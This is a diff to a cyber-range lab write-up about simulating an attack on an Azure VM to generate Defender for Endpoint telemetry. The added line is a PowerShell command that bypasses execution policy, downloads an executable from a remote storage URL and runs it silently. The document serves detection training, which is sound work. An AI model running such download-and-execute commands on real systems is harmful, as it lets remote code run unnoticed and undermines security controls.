@@ -31,7 +31,10 @@ The objective was to:
 
 ### 1. Simulate the Attack and Generate Logs
 
-I accessed the Azure virtual machine and executed the above PowerShell script to simulate malicious activity and generate telemetry for Defender for Endpoint.
+I accessed the Azure virtual machine and executed the PowerShell script to simulate malicious activity and generate telemetry for Defender for Endpoint.
+
+Powershell Script: cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait" 
+
 
 
 <img width="1928" height="1269" alt="Screenshot (815)" src="https://github.com/user-attachments/assets/a5315118-550d-4d06-9c8d-08ba9a313cb2" />
